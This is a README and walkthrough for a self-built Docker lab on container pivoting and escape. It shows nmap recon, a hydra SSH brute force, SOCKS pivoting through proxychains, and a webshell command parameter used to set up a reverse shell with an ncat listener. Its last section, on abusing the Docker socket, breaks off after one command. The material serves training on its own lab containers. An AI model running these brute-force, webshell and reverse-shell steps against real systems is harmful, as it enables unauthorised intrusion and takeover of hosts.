# Attack Container Simple Lab
This lab is made for testing attack container with 2 vulns, whichs are "Share network namespace" and "Insecure volumn mounts"

## Architecture


## Setup
### Create secret-public ssh key pair
```bash
mkdir -p ./ssh-key ./authorized_keys
ssh-keygen -t rsa -N "" -f ./ssh-key/id_rsa
cp ./ssh-key/id_rsa.pub ./authorized_keys/authorized_keys
chmod 644 ./authorized_keys/authorized_keys
chmod -R 777 ./ssh-key
chown nobody:nogroup ./ssh-key/id_rsa
```

### Run the lab
```bash
docker-compose up -d --build
```

#### Access to attacker
```bash
docker exec -it attacker /bin/bash
```

## Testing
1. From container `attacker` ping `helper`:
```bash
docker exec -it attacker ping 172.16.100.11
```

2. From `attacker` ping `victim` fail:
```bash
docker exec -it attacker ping 172.16.101.11
```

## Walkthrough
From `attacker`, we attack to the `helper` which we can assume that it is a public facing server. The `helper` has the same network as `victim` (share network namespace) -> so we can abuse this and pivot in to container `victim`. Finally, the container `victim` has "Insecure volumn mounting" vulnerability so we can escape the container and control the host.

### Share network namespace:
First, access the container `attacker`:
```bash
docker exec -it attacker /bin/bash
```

Next, we try to ping to `helper` to check the connection
```bash
root@attacker:/# ping helper
PING helper (172.16.100.11) 56(84) bytes of data.
64 bytes from helper.acsl_attacker_net (172.16.100.11): icmp_seq=1 ttl=64 time=0.391 ms
64 bytes from helper.acsl_attacker_net (172.16.100.11): icmp_seq=2 ttl=64 time=0.042 ms
64 bytes from helper.acsl_attacker_net (172.16.100.11): icmp_seq=3 ttl=64 time=0.041 ms
64 bytes from helper.acsl_attacker_net (172.16.100.11): icmp_seq=4 ttl=64 time=0.055 ms
^C
--- helper ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3083ms
rtt min/avg/max/mdev = 0.041/0.132/0.391/0.149 ms
root@attacker:/#
```

Recon the `helper`:
```bash
root@attacker:/# nmap -sC -sV -A -oA nmap/details -p `for i in $(nmap --min-rate 10000 -p- -oA nmap/allports helper | grep -E "^[0-9]" | awk -F/ '{print $1}'); do echo -n $i,; done` helper
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 21:27 +03
Nmap scan report for helper (172.16.100.11)
Host is up (0.00012s latency).
rDNS record for 172.16.100.11: helper.acsl_attacker_net

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 31:9d:b0:00:0c:d9:4d:22:fe:52:a2:8c:13:44:7d:f2 (ECDSA)
|_  256 0f:75:49:55:3d:14:62:00:d7:e1:89:75:1b:22:b4:a6 (ED25519)
MAC Address: BA:3A:8C:F4:DD:3E (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 4.15 - 5.8 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.0 - 5.5 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.3 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.12 ms helper.acsl_attacker_net (172.16.100.11)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.88 seconds
```

Try to brute force service `ssh` of `helper`:
```bash
root@attacker:/# hydra -l root -P /home/rock.txt ssh://172.16.100.11
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-12 21:30:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:1/p:14), ~1 try per task
[DATA] attacking ssh://172.16.100.11:22/
[22][ssh] host: 172.16.100.11   login: root   password: iloveyou
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-12 21:30:51
```

Initial access to `helper`:
```bash
root@attacker:/# ssh root@helper
root@helper's password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon May 12 18:20:17 2025 from 172.16.100.10
root@helper:~# id
uid=0(root) gid=0(root) groups=0(root)
root@helper:~#
```

`ifconfig` shows that the helper machine is part of two network families
```bash
root@helper:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.100.11  netmask 255.255.255.0  broadcast 172.16.100.255
        ether ba:3a:8c:f4:dd:3e  txqueuelen 0  (Ethernet)
        RX packets 134263  bytes 7912749 (7.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 134222  bytes 7416679 (7.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.101.10  netmask 255.255.255.0  broadcast 172.16.101.255
        ether ce:23:2b:c2:e3:39  txqueuelen 0  (Ethernet)
        RX packets 22  bytes 1688 (1.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 504 (504.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Using ping sweep to scan for alive hosts
```bash
root@helper:~# for i in $(seq 1 254); do (ping -c 1 172.16.101.${i} | grep "64 bytes from" | grep -oE "([0-9]{1,3}[\.]){3}[0-9]{1,3}" &); done;
172.16.101.1
172.16.101.10
172.16.101.11
root@helper:~#
```
We can determine that the IP 172.16.101.1 is the gateway's IP, 172.16.101.10 is `helper`'s IP, therefore the 172.16.101.11 is the victim's IP.


Back to our `attacker` machine. We are creating **dynamic port forwarding leverages the SOCKS proxy**. This will deliver all the traffic through an ssh connection, via, given port to the destination server. Here we are forwarding all the traffics to the attacker machine
```bash
root@attacker:/etc# ssh -D 9050 root@172.16.100.11 -f -N
root@172.16.100.11's password:
root@attacker:/etc#
```

We are going to use the `proxychains`. Check if the port specified in “/etc/proxychains.conf” should be the same as dynamic port. 

Then we will scan the victim's IP, which is 172.16.101.11
```bash
root@attacker:/# proxychains nmap -sT -Pn 172.16.101.11
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 21:56 +03
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.101.11:3389 <--socket error or timeout!
....
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.101.11:5566 <--socket error or timeout!
Nmap scan report for 172.16.101.11 (172.16.101.11)
Host is up (0.00057s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```
We used the `-Pn` flag to skip host discovery. The reason why we cannot ping is that proxies do not support ICMP protocols. Their working OSI layers are different while proxychains can only proxy TCP connections.

Now we try to access the web service of `victim`
```bash
root@attacker:/# proxychains -q curl http://172.16.101.11 -I
HTTP/1.1 200 OK
Server: nginx/1.27.5
Date: Mon, 12 May 2025 19:01:12 GMT
Content-Type: text/html
Content-Length: 18
Last-Modified: Mon, 12 May 2025 17:53:46 GMT
Connection: keep-alive
ETag: "682235aa-12"
Accept-Ranges: bytes

```

To keep this lab simple, we can assume that we have discovered the webshell in `/test.php`
```
root@attacker:/# proxychains -q curl http://172.16.101.11/test.php?cmd=echo+"hellowordl!"
```

Exploit this and get the reverse shell directly from `victim` to our `attacker` machine. First, we have to setup a remote forwarding port again and listen for reverse shell connection
```bash
ssh -R :80:172.16.100.10:80 -R :1331:172.16.100.10:1331 root@helper -N -f
proxychains4 -q ./poc.sh 172.16.101.11
python3 -m http.server 80
ncat -lvnp 1331
```

Next, we send the revershell payload to `victim`
```bash
root@attacker:/# proxychains -q curl http://172.16.101.11/test.php?cmd=<<rev_shell_payload>>
```

Finally, we are into the `victim` machine

### Insecure volumn mounting
...
```bash
./docker -H unix:///var/run/docker.sock ps
```






